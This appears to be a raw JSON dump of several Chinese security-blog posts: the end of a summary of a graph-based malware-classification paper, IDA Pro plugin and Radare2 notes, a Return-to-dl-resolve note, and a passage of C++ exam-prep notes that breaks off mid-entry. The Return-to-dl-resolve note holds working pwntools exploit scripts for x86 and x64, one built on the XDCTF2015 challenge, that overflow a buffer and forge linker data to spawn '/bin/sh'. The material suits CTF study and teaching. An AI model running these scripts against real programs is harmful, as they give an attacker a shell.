convolution\nSDGNet\u7684Acc\u3001mPrec\u548cmF-1\u4f9d\u65e7\u6700\u9ad8\uff0c\u4e5f\u5c31\u662f\u8bf4\u4e0e\u5176\u4ed6\u57fa\u4e8e\u56fe\u5377\u79ef\u7684\u5206\u7c7b\u7b97\u6cd5\u76f8\u6bd4\uff0c\u4f5c\u8005\u7684\u65b9\u6cd5\u53ef\u4ee5\u83b7\u5f97\u66f4\u9ad8\u7684\u6027\u80fd\u3002\u5176\u4e2dMDGCN\u548cMatchGNet\u8868\u73b0\u6bd4GCN\u3001PSCN\u3001DGCNN\u548cGraphsage\uff0c\u8fd9\u8bf4\u660e\u591a\u8df3\u90bb\u5c45\u7684\u7279\u5f81\u805a\u5408\u6709\u5229\u4e8e\u63d0\u9ad8\u5206\u7c7b\u7cbe\u5ea6\u3002\n3.2.3 \u8d85\u53c2\u6570\u9009\u62e9\nSDGCN\u7684\u635f\u5931\u51fd\u6570\u4e2d\u4f7f\u7528\u8d85\u53c2\u6570$\\lambda$\uff0c\u4e0b\u56fe\u4e3a\u5b83\u7684\u503c\u4e0eaccuracy\u7684\u5173\u7cfb\uff1a\nhyperparameter\n\u5f53$\\lambda$\u662f0\u65f6\uff0c\u53ea\u6709\u5206\u7c7b\u635f\u5931\uff0cacc\u4e3a0.952\uff1b\u5f53$\\lambda$\u662f1\u65f6\uff0c\u53ea\u6709\u56fe\u7279\u5f81\u635f\u5931\uff0cacc\u4e3a0.927\u3002\u5f53$\\lambda$\u57280.1\u52300.4\u533a\u95f4\u65f6\uff0c\u5206\u7c7b\u635f\u5931\u6743\u91cd\u6bd4\u56fe\u7279\u5f81\u635f\u5931\u6743\u91cd\u5927\uff0c\u5206\u7c7bacc\u968f$\\lambda$\u589e\u5927\u9010\u6e10\u589e\u9ad8\uff1b\u5f53$\\lambda$\u57280.6\u52300.9\u533a\u95f4\uff0c\u56fe\u7279\u5f81\u635f\u5931\u6743\u91cd\u6bd4\u5206\u7c7b\u635f\u5931\u6743\u91cd\u5c0f\uff0c\u5206\u7c7bacc\u968f$\\lambda$\u589e\u5927\u9010\u6e10\u51cf\u5c0f\u3002\u5f53$\\lambda$\u4e3a0.5\u65f6\uff0c\u4e24\u8005\u635f\u5931\u6743\u91cd\u76f8\u7b49\uff0c\u5f97\u5230\u6700\u9ad8\u7684\u5206\u7c7bacc\u3002\u8fd9\u8bf4\u660e\u6dfb\u52a0\u4e86\u9002\u5f53\u7684\u56fe\u7279\u5f81\u635f\u5931\u53ef\u4ee5\u63d0\u5347\u6076\u610f\u8f6f\u4ef6\u5206\u7c7b\u6027\u80fd\u3002\n3.2.4 \u4e0d\u540c\u7c7b\u522b\u6076\u610f\u8f6f\u4ef6\u5206\u7c7b\u7ed3\u679c\n{0\uff1a\u6b63\u5e38\u8f6f\u4ef6\uff0c1\uff1a\u52d2\u7d22\u8f6f\u4ef6\uff0c2\uff1a\u6316\u77ff\u8f6f\u4ef6\uff0c3\uff1aDDoS\uff0c4\uff1a\u8815\u866b\uff0c5\uff1a\u75c5\u6bd2\uff0c6\uff1a\u540e\u95e8\uff0c7\uff1a\u6728\u9a6c}\nconfusion matrix\n\u5728\u5f52\u4e00\u5316\u6df7\u6dc6\u77e9\u9635\u4e2d\uff0c\u4ece\u6bcf\u79cd\u6076\u610f\u8f6f\u4ef6\u4e4b\u95f4\u7684\u6bd4\u8f83\u4e2d\u5f97\u5230\u4e86\u4e24\u4e2a\u89c2\u5bdf\u7ed3\u679c\uff1a\n\nSDGNet\u5728DDoS\u3001\u75c5\u6bd2\u548c\u6728\u9a6c\u4e0a\u7684\u5206\u7c7b\u6027\u80fd\u4f18\u4e8e\u5176\u4ed6\u5206\u7c7b\uff0c\u5728\u540e\u95e8\u4e0a\u7684\u5206\u7c7b\u6027\u80fd\u662f\u6240\u6709\u7c7b\u522b\u4e2d\u6700\u5dee\u7684\u3002\n\u6240\u6709DDoS\u3001\u75c5\u6bd2\u3001\u540e\u95e8\u548c\u6728\u9a6c\u90fd\u88ab\u68c0\u6d4b\u4e3a\u6076\u610f\u8f6f\u4ef6\u3002\u4f46\u662f\uff0c\u8bb8\u591a\u6316\u77ff\u8f6f\u4ef6\uff08\u5360\u6240\u6709\u6316\u77ff\u6076\u610f\u8f6f\u4ef6\u76845%\uff09\u88ab\u68c0\u6d4b\u4e3a\u6b63\u5e38\u8f6f\u4ef6\uff0c\u8fd9\u662fMDGNet\u7684\u5f31\u70b9\u30023%\u7684\u6316\u77ff\u6076\u610f\u8f6f\u4ef6\u548c2%\u7684\u8815\u866b\u88ab\u68c0\u6d4b\u4e3a\u6b63\u5e38\u8f6f\u4ef6\uff0c\u5e94\u52a0\u4ee5\u6539\u8fdb\u3002\n\n3.2.5 \u6a21\u578b\u7b80\u5316\u5b9e\u9a8c\uff08Ablation Studies\uff09\n\nSDGNet\u4e0d\u540c\u7ec4\u4ef6\u7684\u5f71\u54cd\n\ndifferent components in SDGNet\n\u56db\u5927\u7ec4\u4ef6\uff1a\n\nMF\uff1a\u878d\u5408\u7ed3\u70b9\u5d4c\u5165\u7684\u591a\u4e2a\u65b9\u9762\u7279\u5f81\u7684\u7279\u5f81\u878d\u5408\u7ec4\u4ef6\nLC\uff1a\u8fde\u63a5\u4e0d\u540c\u5c42\u7684\u56fe\u8868\u793a\u7684\u7279\u5f81\u8fde\u63a5\u7ec4\u4ef6\nCN\uff1a\u4e3a\u5206\u7c7b\u964d\u7ef4\u56fe\u8868\u793a\u7684\u7279\u5f81\u63d0\u53d6\u548c\u964d\u7ef4\u7ec4\u4ef6\nGL\uff1a\u56fe\u7279\u5f81\u635f\u5931\n\n\u201cLC+MF+CN+GL\u201d\u6574\u4f53\u8868\u73b0(mF-1)\u6bd4\u201cLC+MF+CN\u201d\u5dee\uff0c\u8868\u660e\u9644\u52a0\u7684\u56fe\u7279\u5f81\u635f\u5931\u53ef\u4ee5\u63d0\u9ad8\u5206\u7c7b\u7cbe\u5ea6\u6027\u80fd\uff0c\u4f46\u4f1a\u524a\u5f31\u53ec\u56de\u6027\u80fd\u3002\n\u5bf9\u201cLC+MF+CN\u201d\u548c\u201cLC+MF\u201d\u7684\u6bd4\u8f83\u8868\u660e\uff0c\u8fde\u63a5\u4e0d\u540c\u5c42\u56fe\u8868\u793a\u540e\u7684\u964d\u7ef4\u53ef\u4ee5\u63d0\u9ad8\u5206\u7c7b\u6027\u80fd\u3002\n\u201cLC+MF+CN\u201d\u548c\u201cMF+CN\u201d\u4e4b\u95f4\u7684\u6bd4\u8f83\u8868\u660e\uff0c\u4e0d\u540c\u5c42\u7684\u56fe\u8868\u793a\u7684\u7279\u5f81\u7ea7\u8054\u53ef\u4ee5\u663e\u8457\u63d0\u9ad8\u5206\u7c7b\u5668\u7684\u6027\u80fd\u3002\n\u5bf9\u201cLC+MF\u201d\u548c\u201cLC\u201d\u7684\u6bd4\u8f83\u8868\u660e\uff0c\u4e0d\u540c\u5c42\u56fe\u8868\u793a\u7684\u7279\u5f81\u878d\u5408\u53ef\u4ee5\u663e\u8457\u63d0\u9ad8\u5206\u7c7b\u6027\u80fd\u3002\n\nMDGCN\u4e0d\u540c\u7ec4\u4ef6\u7684\u5f71\u54cd\n\ndifferent components in MDGCN\n\u524d\u4e09\u9879\u7684\u6bd4\u8f83\u8868\u660e\u878d\u5408\u7ed3\u70b9\u5d4c\u5165\u7684\u4e0d\u540c\u65b9\u9762\u4e4b\u524d\u7684\u7ef4\u6570\u6269\u5c55\u53ef\u4ee5\u63d0\u9ad8\u5206\u7c7b\u7684\u6027\u80fd\uff0c\u5177\u6709\u7ed3\u6784\u4fe1\u606f\u7684\u7ef4\u6570\u6269\u5c55\u53ef\u4ee5\u8fdb\u4e00\u6b65\u63d0\u9ad8\u6027\u80fd\u3002\n\u5bf9\u201cGate\u201d\u548c\u201cnaive GCN\u201d\u7684\u6bd4\u8f83\u8868\u660e\uff0c\u91c7\u7528\u95e8\u63a7\u673a\u5236\u7684\u7ed3\u70b9\u5d4c\u5165\u7279\u5f81\u63d0\u53d6\u53ef\u4ee5\u63d0\u9ad8\u5206\u7c7b\u6027\u80fd\u3002\u7136\u800c\uff0c\u4f7f\u7528\u95e8\u63a7\u673a\u5236\u4f1a\u4f7f\u5047\u9633\u7387\u589e\u52a0\uff0c\u8fd9\u4e3b\u8981\u662f\u56e0\u4e3a\u95e8\u63a7\u673a\u5236\u901a\u8fc7\u52a8\u6001\u52a0\u6743\u56fe\u4e0a\u7684\u7ed3\u70b9\u6765\u6982\u62ec\u5168\u5c40\u7279\u5f81\u3002\u5168\u5c40\u7279\u5f81\u6709\u52a9\u4e8e\u8bc6\u522b\u6076\u610f\u8f6f\u4ef6\uff0c\u800c\u5c40\u90e8\u7279\u5f81\u6709\u52a9\u4e8e\u8bc6\u522b\u826f\u6027\u8f6f\u4ef6\u3002\n\naugment GCN\u7684\u5f71\u54cd\n\ndifferent dimension expansion methods\n\u4e0e\u201cFC\u201d\u548c\u201cAug\u201d\u76f8\u6bd4\uff0c\u201cFC+Aug\u201d\u8fbe\u5230\u4e86\u6700\u9ad8\u7684\u51c6\u786e\u7387\u3002\u8fd9\u4e00\u7ed3\u679c\u8868\u660e\uff0c\u201cAug\u201d\u6355\u83b7\u7684\u7ed3\u6784\u4fe1\u606f\u66f4\u6709\u52a9\u4e8e\u63d0\u9ad8\u5206\u7c7b\u7b97\u6cd5\u7684\u51c6\u786e\u7387\u3002\n\u4e0e\u201cFC\u201d\u548c\u201cAug\u201d\u76f8\u6bd4\uff0c\u201cFC+Aug\u201d\u5177\u6709\u6700\u9ad8\u7684\u5fae\u7cbe\u5ea6\u503c\u3002\u8fd9\u4e00\u7ed3\u679c\u8868\u660e\uff0c\u201cAug\u201d\u6355\u83b7\u7684\u7ed3\u6784\u4fe1\u606f\u66f4\u6709\u52a9\u4e8e\u63d0\u9ad8\u5206\u7c7b\u7b97\u6cd5\u7684\u7cbe\u5ea6\u3002\n\u4e0e\u201cFC\u201d\u548c\u201cAug\u201d\u76f8\u6bd4\uff0c\u201cAug\u201d\u5177\u6709\u6700\u9ad8\u7684\u5fae\u53ec\u56de\u7387\u3002\u8fd9\u4e00\u7ed3\u679c\u8868\u660e\uff0c\u5c06\u201cAug\u201d\u548c\u201cFC\u201d\u6355\u83b7\u7684\u4fe1\u606f\u878d\u5408\u5728\u4e00\u8d77\u5bf9\u8bc6\u522b\u6076\u610f\u8f6f\u4ef6\u65e0\u5e2e\u52a9\u3002\n\u4e0e\u201cFC\u201d\u548c\u201cAug\u201d\u76f8\u6bd4\uff0c\u201cFC+Aug\u201d\u5177\u6709\u6700\u9ad8\u7684\u5faeF-1\u503c\u3002\u7531\u4e8e\u201cFC+Aug\u201d\u7684\u6574\u4f53\u6027\u80fd\u8f83\u597d\uff0c\u672c\u6587\u9009\u62e9\u4e86\u8fd9\u79cd\u7ed3\u6784\u6765\u6269\u5c55\u7ed3\u70b9\u5d4c\u5165\u7ef4\u6570\u3002\n4\u3001\u603b\u7ed3\u4e0e\u7814\u7a76\u542f\u53d1\n\u628aAPI\u5e8f\u5217\u8f6c\u5316\u4e3a\u6709\u5411\u56fe\u6765\u89e3\u51b3\u6076\u610f\u8f6f\u4ef6\u68c0\u6d4b\u7684\u95ee\u9898\uff0c\u65b9\u6cd5\u5f88\u65b0\u9896\uff0c\u552f\u4e00\u8981\u62c5\u5fc3\u7684\u53ef\u80fd\u5c31\u662f0day\u653b\u51fb\u548c\u5bf9\u6297\u6027\u95ee\u9898\u3002\u8bad\u7ec3\u96c6\u4e2d\u7684\u6570\u636e\uff0c\u4f8b\u5982API\u7c7b\u578b\uff0c\u662f\u5426\u80fd\u6cdb\u5316\u5230\u771f\u5b9e\u60c5\u51b5\u4e0b\u3002\u4ee5\u53ca\u9488\u5bf9\u56fe\u7f51\u7edc\u7684\u5bf9\u6297\u653b\u51fb\uff0c\u4f8b\u5982\u589e\u5220\u7ed3\u70b9\u6216\u8fb9\uff0c\u662f\u5426\u4f1a\u5f71\u54cd\u68c0\u6d4b\u7ed3\u679c\u3002\u8fd9\u4e9b\u90fd\u9700\u8981\u672a\u6765\u505a\u9a8c\u8bc1\u3002\n\u6700\u540e\u4e0d\u77e5\u9053\u56fe\u4e2d\u662f\u5426\u80fd\u518d\u7ec6\u5316\u4ee5\u4e0b\u7ed3\u70b9\u548c\u8fb9\u7684\u5c5e\u6027\u3002\u4f8b\u5982\u5bf9\u4e8e\u7ed3\u70b9\u6765\u8bf4\uff0c\u6709\u4e00\u4e9bAPI\u662f\u4e13\u95e8\u9488\u5bf9\u6587\u4ef6\u7684\u64cd\u4f5c\uff1b\u5bf9\u4e8e\u8fb9\u6765\u8bf4\uff0c\u90bb\u63a5API\u7ed3\u70b9\u95f4\u8c03\u7528\u6240\u7528\u65f6\u95f4\u7684\u5927\u5c0f\u7b49\u7b49\u3002\n", "categories": [{"name": "paper", "slug": "paper", "permalink": "/category/paper/"}], "tags": [{"name": "paper", "slug": "paper", "permalink": "/tag/paper/"}, {"name": "malware", "slug": "malware", "permalink": "/tag/malware/"}, {"name": "graph", "slug": "graph", "permalink": "/tag/graph/"}]}, {"title": "IDA Pro \u63d2\u4ef6\u8bb0\u5f55", "date": "2020-07-08T22:18:00-00.00", "path": "/archives/IdaPlug/", "text": "IDA Pro \u63d2\u4ef6\u8bb0\u5f55\n\nversion: 7.5\n\nBinaryAI\npip install --upgrade binaryai\n# then you can add the binaryai plugin into $IDAUSR\nbinaryai install_ida_plugin\n\nflare-emu\nimport flare_emu\n\ndef decrypt(argv):\n    myEH = flare_emu.EmuHelper()\n    myEH.emulateRange(myEH.analysisHelper.getNameAddr(&quot;decryptString&quot;), registers = {&quot;arg1&quot;:argv[0], &quot;arg2&quot;:argv[1], \n                           &quot;arg3&quot;:argv[2], &quot;arg4&quot;:argv[3]})\n    return myEH.getEmuString(argv[0])\n\ndef iterateCallback(eh, address, argv, userData):\n    s = decrypt(argv)\n    print(&quot;%s: %s&quot; % (eh.hexString(address), s))\n    eh.analysisHelper.setComment(address, s, False)\n\nif __name__ == &#39;__main__&#39;:   \n    eh = flare_emu.EmuHelper()\n    eh.iterate(eh.analysisHelper.getNameAddr(&quot;decryptString&quot;), iterateCallback)\n\nx64dbgida\n\u5b98\u65b9\u63d2\u4ef6\nVT-IDA Plugin\n\u5b98\u65b9\u63d2\u4ef6\uff0c\u8fd8\u5728\u5f00\u53d1\uff0c\u6781\u5176\u4e0d\u7a33\u5b9a\nLazyIDA\nshortcuts:\n\nDisasm Window:\nw: Copy address of current line into clipboard\n\n\nHex-rays Window:\nw: Copy address of current item into clipboard\nc: Copy name of current item into clipboard\nv: Remove return type of current item\n\n\n\nPonce\n\u7b26\u53f7\u6267\u884c+\u6c61\u70b9\u4f20\u64ad\nKarta\n\nDocs\n\nLighthouse\nA Code Coverage Explorer\n", "categories": [{"name": "reverse", "slug": "reverse", "permalink": "/category/reverse/"}], "tags": [{"name": "reverse", "slug": "reverse", "permalink": "/tag/reverse/"}, {"name": "ida", "slug": "ida", "permalink": "/tag/ida/"}]}, {"title": "Radare2\u7b14\u8bb0", "date": "2020-07-05T17:20:00-00.00", "path": "/archives/Radare2Note/", "text": "Radare2\u7b14\u8bb0\nradare2\ncommon:\n\n\n\n  Command\n  Description\n\n\n\n\n  aaaa\n  Fully analyze the binary\n\n\n  afl\n  List all the functions in the binary\n\n\n  afv\n  Analyze the functions variables\n\n\n  ii\n  List imports\n\n\n  iI\n  Information about the binary\n\n\n  iz\n  List strings in the binary\n\n\n  sf function\n  Seek to a function\n\n\n  pdb\n  Print disassembly of the basic block\n\n\n  pdf\n  Print disassembly of the function\n\n\n\nbreakpoint:\n\n\n\n  Command\n  Description\n\n\n\n\n  db memaddress\n  Set a breakpoint\n\n\n  dc\n  Continue the execution flow to breakpoint(s)\n\n\n  dt\n  Run the current instruction\n\n\n  dr\n  Inspect the registers\n\n\n\nrahash2\nrahash2 -L: \u5217\u4e3e\u652f\u6301\u7684\u7b97\u6cd5\n\u5e38\u89c1\u7528\u6cd5\uff1a\n\n\u5b57\u7b26\u4e32\u54c8\u5e0c\uff1arahash2 -a md5 -s admin\n\u6587\u4ef6\u54c8\u5e0c\uff1arahash2 -a md5 bin\n\n", "categories": [{"name": "reverse", "slug": "reverse", "permalink": "/category/reverse/"}], "tags": [{"name": "reverse", "slug": "reverse", "permalink": "/tag/reverse/"}, {"name": "radare2", "slug": "radare2", "permalink": "/tag/radare2/"}]}, {"title": "Return-to-dl-resolve\u7b14\u8bb0", "date": "2019-07-17T15:26:00-00.00", "path": "/archives/Return-to-dl-resolve/", "text": "Return-to-dl-resolve\nx86\nfrom pwn import *\nelf = ELF(&#39;./bin&#39;)\n\ndef dl_resolve_data(base_stage, fun_name):\n    # base_stage : dl_resolve_data_addr\n    # fun_name : str\n    # 40 &lt; len(return) &lt;= 50\n    strtab = elf.dynamic_value_by_tag(&#39;DT_STRTAB&#39;) # &quot;.dynstr&quot;\n    symtab = elf.dynamic_value_by_tag(&#39;DT_SYMTAB&#39;) # &quot;.dynsym&quot;\n    syment = elf.dynamic_value_by_tag(&#39;DT_SYMENT&#39;) # 0x10\n\n    fake_sym_addr = base_stage + 0x8\n    align = syment - ((fake_sym_addr - symtab) &amp; 0xf)\n    fake_sym_addr = fake_sym_addr + align   # fake_sym_addr\n    index_dynsym = (fake_sym_addr - symtab) / syment\n\n    st_name = (base_stage + 40) - strtab # fun_name.addr - strtab\n\n    payload  = p32(base_stage) + p32((index_dynsym &lt;&lt; 8) | 0x7)\n    payload += &#39;B&#39; * align\n    payload += p32(st_name) + p32(0) + p32(0) + p32(0x12)\n    payload += &#39;B&#39; * (40 - len(payload))\n    payload += fun_name + &quot;\\x00&quot;\n\n    return payload\n\ndef dl_resolve_call(data_addr, args_addr):\n    # data_addr : dl_resolve_data_addr\n    # args_addr : args_addr\n    # len(return) == 0x10\n    jmprel = elf.dynamic_value_by_tag(&#39;DT_JMPREL&#39;)\n\n    reloc_offset = data_addr - jmprel\n\n    buf  = p32(elf.get_section_by_name(&quot;.plt&quot;).header[&#39;sh_addr&#39;]) # plt_0\n    buf += p32(reloc_offset)\n    buf += &#39;AAAA&#39;\n    buf += p32(args_addr)\n\n    return buf\n\n\u5176\u4e2d\uff1a\n\ndl_resolve_data()\uff1a\u4f2a\u9020\u7684\u6570\u636e\uff0cfun_name\u4e3a\u8c03\u7528\u7684\u51fd\u6570\u540d(&quot;system&quot;)\ndl_resolve_call()\uff1a\u4f2a\u9020\u8c03\u7528\u6808\uff0cargs_addr\u4e3a\u51fd\u6570\u53c2\u6570\u5730\u5740(addr(\u201c/bin/sh\\x00\u201d))\ndl_resolve_data()\u7684base_stage\u4e0edl_resolve_call()\u7684data_addr\u5e94\u4e00\u81f4\uff0c\u4e3adl_resolve_data()\u5199\u5165\u6570\u636e\u7684\u8d77\u59cb\u5730\u5740\n\n\u4f8b\u5b50\uff1a\nif __name__ == &quot;__main__&quot;:\n    offset = 112\n    read_plt = elf.plt[&#39;read&#39;]\n\n    ppp_ret = 0x08048619 # ROPgadget --binary bof --only &quot;pop|ret&quot;\n\n    base_stage = 0x0804a040 # readelf -S bof | grep &quot;.bss&quot;\n\n    r.recvuntil(&#39;Welcome to XDCTF2015~!\\n&#39;)\n\n    resolve_data_addr = base_stage + 0x10\n    func_name = &quot;system&quot;\n    Args = &quot;/bin/sh&quot;\n    args_addr = base_stage\n\n    payload  = &#39;A&#39; * offset\n    payload += p32(read_plt)\n    payload += p32(ppp_ret)\n    payload += p32(0)\n    payload += p32(base_stage)\n    payload += p32(100)\n    payload += dl_resolve_call(resolve_data_addr, args_addr)\n    r.sendline(payload)\n\n    payload2 = Args.ljust(0x10,&quot;\\x00&quot;)\n    payload2 += dl_resolve_data(resolve_data_addr, func_name)\n\n    r.sendline(payload2)\n\n    r.interactive()\n\nx64\n\u5927\u90e8\u5206\u57fa\u672c\u4e00\u81f4\uff0c\u53ea\u662f\u53c2\u6570\u8981\u901a\u8fc7pop_rdi\u4f20\u9012\uff1a\nfrom pwn import *\nelf = ELF(&#39;./bin&#39;)\n\ndef Align(addr, origin, size):\n    padlen = size - ((addr-origin) % size)\n    return (addr+padlen, padlen)\n\ndef dl_resolve_data(base_stage, fun_name):\n    # base_stage : dl_resolve_data_addr\n    # fun_name : str\n\n    strtab = elf.dynamic_value_by_tag(&#39;DT_STRTAB&#39;) # &quot;.dynstr&quot;\n    symtab = elf.dynamic_value_by_tag(&#39;DT_SYMTAB&#39;) # &quot;.dynsym&quot;\n    syment = elf.dynamic_value_by_tag(&#39;DT_SYMENT&#39;)\n    relaent = elf.dynamic_value_by_tag(&#39;DT_RELAENT&#39;)\n    jmprel = elf.dynamic_value_by_tag(&#39;DT_JMPREL&#39;)\n\n    addr_reloc, padlen_reloc = Align(base_stage, jmprel, relaent)\n    addr_sym, padlen_sym = Align(addr_reloc+relaent, symtab, syment)\n\n    addr_symstr = addr_sym + syment\n\n    r_info = (((addr_sym - symtab) / syment) &lt;&lt; 0x20) | 0x7\n    st_name = addr_symstr - strtab\n\n    payload  = &#39;A&#39; * padlen_reloc\n    payload += p64(base_stage) + p64(r_info) + p64(0)\n    payload += &#39;B&#39; * padlen_sym\n    payload += p32(st_name) + p32(0x12) + p64(0) + p64(0)\n    payload += fun_name + &quot;\\x00&quot;\n\n    return payload\n\ndef dl_resolve_call(data_addr):\n    # data_addr : dl_resolve_data_addr\n    # len(return) == 0x10\n    jmprel = elf.dynamic_value_by_tag(&#39;DT_JMPREL&#39;)\n    relaent = elf.dynamic_value_by_tag(&#39;DT_RELAENT&#39;)\n\n    addr_reloc, padlen_reloc = Align(data_addr, jmprel, relaent)\n    reloc_offset = (addr_reloc - jmprel) / relaent\n\n    buf  = p64(elf.get_section_by_name(&quot;.plt&quot;).header[&#39;sh_addr&#39;]) # plt_0\n    buf += p64(reloc_offset)\n\n    return buf\n\n\u4f46\u662flink_map+0x1c8\u8981\u7f6e0\uff0c\u4f8b\u5b50\u5982\u4e0b\uff1a\ndef call64(call_got,arg1,arg2,arg3,ret):\n    payload  = p64(0x40064A) +p64(0) + p64(1)\n    payload += p64(call_got) + p64(arg3) + p64(arg2) + p64(arg1)\n    payload += p64(0x400630)\n    payload += &quot;a&quot;*56\n    payload += p64(ret)\n    return payload\n\nif __name__ == &quot;__main__&quot;:\n    offset = 0x20 + 8\n    read_plt = elf.plt[&#39;read&#39;]\n    write_plt = elf.plt[&#39;write&#39;]\n    read_got = elf.got[&#39;read&#39;]\n    write_got = elf.got[&#39;write&#39;]\n\n    base_stage = 0x601040 + 0x400 # readelf -S bof | grep &quot;.bss&quot;\n    got_0 = elf.dynamic_value_by_tag(&#39;DT_PLTGOT&#39;)\n    vuln_addr = 0x40059F\n    pop_rdi_ret = 0x400653\n    leave_ret = 0x04006ab\n\n    r.recvuntil(&#39;flag\\n&#39;)\n    r.recv(100)\n    payload  = &#39;A&#39; * offset\n    payload += call64(write_got,1,got_0+8,8, vuln_addr)\n    r.sendline(payload)\n    addr_dt_debug = u64(r.recv(8)) + 0x1c8\n    print hex(addr_dt_debug)\n\n    sleep(0.1)\n\n    payload  = &#39;A&#39; * offset\n    payload += call64(read_got,0,addr_dt_debug,8, vuln_addr)\n    r.sendline(payload)\n\n    sleep(0.1)\n    r.send(p64(0))\n    sleep(0.1)\n\n    resolve_data_addr = base_stage + 0x10\n    func_name = &quot;system&quot;\n    Args = &quot;/bin/sh&quot;\n\n    payload  = &#39;A&#39; * offset\n    payload += call64(read_got,0,base_stage,256, vuln_addr)\n\n    r.sendline(payload)\n\n    payload  = Args.ljust(0x10,&quot;\\x00&quot;)\n    payload += dl_resolve_data(resolve_data_addr, func_name)\n\n    r.sendline(payload)\n\n    payload  = &#39;A&#39; * offset\n    payload += p64(pop_rdi_ret)\n    payload += p64(base_stage)\n    payload += dl_resolve_call(resolve_data_addr)\n\n    r.sendline(payload)\n\n    r.interactive()\n\n", "categories": [{"name": "pwn", "slug": "pwn", "permalink": "/category/pwn/"}], "tags": [{"name": "pwn", "slug": "pwn", "permalink": "/tag/pwn/"}, {"name": "ROP", "slug": "ROP", "permalink": "/tag/ROP/"}]}, {"title": "\u8bfb\u7814\u673a\u8bd5\u51c6\u5907", "date": "2018-06-28T14:17:00-00.00", "path": "/archives/PPCNote/", "text": "\u7ecf\u5178\u5165\u95e8\n\u6392\u5e8f\n// \u6240\u9700\u5934\u6587\u4ef6\n#include &lt;algorithm&gt; // sort()\n#include &lt;string.h&gt;  // strcmp()\n\n// \u5bf9buf[n]\u5347\u5e8f\u6392\u5e8f\nsort(buf, buf + n); \n\n// \u5bf9buf[n]\u91c7\u7528\u6bd4\u8f83\u51fd\u6570cmp\u6392\u5e8f\nbool cmp(T a, T b){\n    return a.x &lt; b.x;\n}\nsort(buf, buf + n, cmp);\n\n// \u7ed3\u6784\u4f53\u5185\u91cd\u8f7d\u8fd0\u7b97\u7b26\nstruct E{\n    char name[101];\n    int age;\n    int score;\n    bool operator &lt; (const E &amp;b) const{\n    \tif(score != b.score)\n    \t\treturn score &lt; b.score;\n    \tint tmp = strcmp(name,b.name);\n    \tif(tmp != 0)\n    \t\treturn tmp &lt; 0;\n    \telse\n    \t\treturn age &lt; b.age;\n    }\n}buf[100];\nsort(buf, buf + 100);\n\n\u65e5\u671f\n// \u5b8f\u5b9a\u4e49\u662f\u5426\u95f0\u5e74\n#define ISYEAR(x) ((x % 100 != 0 &amp;&amp; x % 4 == 0 || x % 400 == 0)? 1: 0)\n\n// \u8bb0\u5f55\u6bcf\u4e2a\u6708\u5929\u6570\nint dayOfMonth[13][2];\n\n// \u65e5\u671f\u7ed3\u6784\u4f53\nstrut Date{\n    int Day;\n    int Month;\n    int Year;\n    void nextDay{\n    \tDay++;\n    \tif(Day &gt; dayOfMonth[Month][ISYEAR(year)]){\n    \t\tDay = 1;\n    \t\tMonth++;\n    \t\tif(Month &gt; 12){\n    \t\t\tMonth = 1;\n    \t\t\tYear++;\n    \t\t}\n    \t}\n    }\n}; \n\n// \u4fdd\u5b58\u9884\u5904\u7406\u5929\u6570\nint buf[5001][13][32];\n\n\u67e5\u627e\n// \u4e8c\u5206\u67e5\u627e\u5148\u6392\u5e8f\nint buf[n];\nsort(buf, buf + n);\nint base = 0, top = n;\nint ans = -1;\nwhile(base &lt;= top){\n    int mid = (base + top) / 2;\n    if(buf[mid] == target){\n    \tans = mid;\n    \tbreak;\n    }\n    else if(buf[mid] &lt; target)\n    \tbase = mid + 1;\n    else\n    \ttop = mid - 1;\n}\nif(ans != -1){\n    printf(&quot;%d&quot;,ans);\n}\n\n\n\u6570\u636e\u7ed3\u6784\n\u6808\n// \u6240\u9700\u5934\u6587\u4ef6\n#include &lt;stack&gt;\n\nstack&lt;int&gt; S; // \u5b9a\u4e49\u6808\u5143\u7d20\u7c7b\u578b\n\nS.push(i); // \u5165\u6808\n\nint x = S.top(); // \u53d6\u6808\u9876\u5143\u7d20\n\nS.pop(); // \u51fa\u6808\n\nS.empty(); // \u5224\u65ad\u6808\u662f\u5426\u4e3a\u7a7a\n\nS.size(); // \u6808\u4e2d\u5143\u7d20\u4e2a\u6570\n\n\n\u5229\u7528\u5806\u6808\u5bf9\u8868\u8fbe\u5f0f\u8fdb\u884c\u6c42\u503c\n1.\u8bbe\u7acb\u4e24\u4e2a\u5806\u6808\uff0c\u4e00\u4e2a\u7528\u6765\u4fdd\u5b58\u8fd0\u7b97\u7b26\uff0c\u53e6\u4e00\u4e2a\u7528\u6765\u4fdd\u5b58\u6570\u5b57\n2.\u5728\u8868\u8fbe\u5f0f\u9996\u5c3e\u6dfb\u52a0\u6807\u8bb0\u8fd0\u7b97\u7b26\uff0c\u8be5\u8fd0\u7b97\u7b26\u8fd0\u7b97\u4f18\u5148\u7ea7\u6700\u4f4e\n3.\u4ece\u5de6\u5230\u53f3\u4f9d\u6b21\u904d\u5386\u5b57\u7b26\u4e32\uff0c\u82e5\u904d\u5386\u5230\u8fd0\u7b97\u7b26\uff0c\u5219\u5c06\u5176\u4e0e\u8fd0\u7b97\u7b26\u6808\u9876\u5143\u7d20\u8fdb\u884c\u6bd4\u8f83\uff0c\u82e5\u8fd0\u7b97\u7b26\u6808\u6808\u9876\u8fd0\u7b97\u7b26\u4f18\u5148\u7ea7\u5c0f\u4e8e\u8fd0\u7b97\u7b26\u6216\u8005\u8fd0\u7b97\u7b26\u6808\u4e3a\u7a7a\uff0c\u5219\u5c06\u8be5\u8fd0\u7b97\u7b26\u5165\u6808\u3002\u904d\u5386\u5b57\u7b26\u4e32\u4e0b\u4e00\u4e2a\u5143\u7d20\n4.\u82e5\u8fd0\u7b97\u7b26\u6808\u9876\u8fd0\u7b97\u7b26\u4f18\u5148\u7ea7\u5927\u4e8e\u8be5\u8fd0\u7b97\u7b26\uff0c\u5219\u5f39\u51fa\u8be5\u6808\u9876\u8fd0\u7b97\u7b26\uff0c\u518d\u4ece\u6570\u5b57\u6808\u4e2d\u4f9d\u6b21\u5f39\u51fa\u4e24\u4e2a\u6808\u9876\u5143\u7d20\uff0c\u5b8c\u6210\u5f39\u51fa\u7684\u8fd0\u7b97\u7b26\u5bf9\u5e94\u7684\u8fd0\u7b97\u5f97\u5230\u7ed3\u679c\u540e\uff0c\u518d\u5c06\u8be5\u7ed3\u679c\u5165\u6808\u6570\u5b57\u6808\uff0c\u91cd\u590d\u6bd4\u8f83\u6b64\u65f6\u6808\u9876\u8fd0\u7b97\u7b26\u4e0e\u5f53\u524d\u904d\u5386\u5230\u7684\u8fd0\u7b97\u7b26\u4f18\u5148\u7ea7\uff0c\u89c6\u5176\u4f18\u5148\u7ea7\u5927\u5c0f\u91cd\u590d\u6b65\u9aa43\u6216\u6b65\u9aa44\n5.\u82e